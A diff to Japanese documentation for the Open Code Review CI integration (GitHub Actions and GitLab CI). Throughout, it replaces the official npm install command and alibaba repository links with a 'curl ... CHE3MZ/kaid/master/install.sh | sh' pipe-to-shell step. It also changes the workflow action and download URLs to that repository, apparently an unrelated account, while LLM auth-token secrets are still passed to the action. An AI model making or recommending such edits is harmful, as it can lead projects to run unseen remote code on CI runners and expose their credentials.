@@ -14,7 +14,7 @@ sidebar:
 1. **PR / MR イベントでトリガー。** 新しい pull request、更新された merge request、または手動の
    `/open-code-review` コメントがジョブをトリガーします。
 2. **runner に `ocr` をインストール**します。通常は
-   `npm install -g @alibaba-group/open-code-review` です。runner は一時的なため、これは実行のたびに発生します。
+   `curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh` です。runner は一時的なため、これは実行のたびに発生します。
 3. **CI secret から `ocr config set` 経由で LLM を設定**します（エンドポイント、token、model）。フォールバックできる永続的な `~/.opencodereview` はありません。
 4. **区間モードでレビューを実行**し、機械可読な出力を得ることで、stdout がクリーンな JSON の外殻になるようにします。
 
@@ -35,14 +35,14 @@ sidebar:
 ## GitHub Actions
 
 上流のワークフローは
-[`examples/github_actions/ocr-review.yml`](https://github.com/alibaba/open-code-review/blob/main/examples/github_actions/ocr-review.yml)
+[`examples/github_actions/ocr-review.yml`](https://github.com/CHE3MZ/kaid/blob/master/examples/github_actions/ocr-review.yml)
 にあります。
 
 ### 何をするか
 
 - `pull_request_target`（`opened`）**および** `issue_comment` イベント（本文が
   `/open-code-review` または `@open-code-review` で始まるもの）でトリガーします。後者はレビュアーが PR にコメントすることで OCR をオンデマンドで再実行できるようにします。（`pull_request` ではなく `pull_request_target` を使うことで、fork から提出された PR でも secret を利用できます。OCR は diff を読むだけで、PR 内のコードは実行しません。）
-- `npm install -g @alibaba-group/open-code-review` で OCR をインストールし、`ocr config set` で設定を書き込み、ブランチ区間モードで中核コマンドを実行します。
+- `curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | sh` で OCR をインストールし、`ocr config set` で設定を書き込み、ブランチ区間モードで中核コマンドを実行します。
 - JSON の外殻を解析し、GitHub Pull Request Review API を通じて各発見をインラインのレビューコメントとして貼り付けます。行情報を持たないコメントはサマリー本文にまとめられます。一括送信が失敗した場合は 1 件ずつの貼り付けにフォールバックし、統計をサマリーコメントに表示します。
 
 ### インストール
@@ -52,7 +52,7 @@ sidebar:
 ```bash
 mkdir -p .github/workflows
 curl -o .github/workflows/ocr-review.yml \
-  https://raw.githubusercontent.com/alibaba/open-code-review/main/examples/github_actions/ocr-review.yml
+  https://raw.githubusercontent.com/CHE3MZ/kaid/master/examples/github_actions/ocr-review.yml
 ```
 
 ### 必須の secret
@@ -74,7 +74,7 @@ curl -o .github/workflows/ocr-review.yml \
 
 ### アクションの入力
 
-上流のワークフローは、`uses: alibaba/open-code-review@main` を通じてレビューを再利用可能なコンポジットアクション（[`action.yml`](https://github.com/alibaba/open-code-review/blob/main/action.yml)）に委譲しています。上記の認証情報に加えて、以下の入力でレビュー自体を調整できます——アクションステップの `with:` に指定してください。
+上流のワークフローは、`uses: CHE3MZ/kaid@master` を通じてレビューを再利用可能なコンポジットアクション（[`action.yml`](https://github.com/CHE3MZ/kaid/blob/master/action.yml)）に委譲しています。上記の認証情報に加えて、以下の入力でレビュー自体を調整できます——アクションステップの `with:` に指定してください。
 
 | 入力 | デフォルト | 説明 |
 |---|---|---|
@@ -84,7 +84,7 @@ curl -o .github/workflows/ocr-review.yml \
 | `stream_progress` | `'false'` | `'true'` にすると、レビューが終了するまで沈黙する代わりに、`[ocr]` の進捗行をワークフローログへライブで流します（stderr の human audience）。表示のみの切り替えで、stderr は引き続きファイルにキャプチャされ、アーティファクトとコメント投稿に使われます。 |
 
 ```yaml
-- uses: alibaba/open-code-review@main
+- uses: CHE3MZ/kaid@master
   with:
     llm_url: ${{ secrets.OCR_LLM_URL }}
     llm_auth_token: ${{ secrets.OCR_LLM_AUTH_TOKEN }}
@@ -97,7 +97,7 @@ curl -o .github/workflows/ocr-review.yml \
 ```
 
 入力の完全な一覧は
-[`action.yml`](https://github.com/alibaba/open-code-review/blob/main/action.yml)
+[`action.yml`](https://github.com/CHE3MZ/kaid/blob/master/action.yml)
 を参照してください——投稿モード（`sticky_summary`、`incremental`）、重要度/カテゴリのルーティング、プッシュをまたぐチェックポイントなどを含みます。
 
 ### カスタマイズ
@@ -188,7 +188,7 @@ if: |
 
 ```yaml
 - name: Install OpenCodeReview
-  run: npm install -g @alibaba-group/open-code-review@1.0.0
+  run: curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | OCR_VERSION=1.0.0 sh
 ```
 
 #### GitHub App として投稿する
@@ -274,7 +274,7 @@ review（または `ocr scan`）を実行してください。
 ## GitLab CI
 
 上流のパイプラインは
-[`examples/gitlab_ci/.gitlab-ci.yml`](https://github.com/alibaba/open-code-review/blob/main/examples/gitlab_ci/.gitlab-ci.yml)
+[`examples/gitlab_ci/.gitlab-ci.yml`](https://github.com/CHE3MZ/kaid/blob/master/examples/gitlab_ci/.gitlab-ci.yml)
 にあります。
 
 ### 何をするか
@@ -290,7 +290,7 @@ review（または `ocr scan`）を実行してください。
 
 ```bash
 curl -o .gitlab-ci.yml \
-  https://raw.githubusercontent.com/alibaba/open-code-review/main/examples/gitlab_ci/.gitlab-ci.yml
+  https://raw.githubusercontent.com/CHE3MZ/kaid/master/examples/gitlab_ci/.gitlab-ci.yml
 ```
 
 すでに `.gitlab-ci.yml` があり、それを保持したい場合は、レシピを別のパスに配置して `include:`
@@ -360,7 +360,7 @@ script:
 
 ```yaml
 script:
-  - npm install -g @alibaba-group/open-code-review@1.0.0
+  - curl -fsSL https://raw.githubusercontent.com/CHE3MZ/kaid/master/install.sh | OCR_VERSION=1.0.0 sh
 ```
 
 #### プッシュのたびの再レビューを避ける
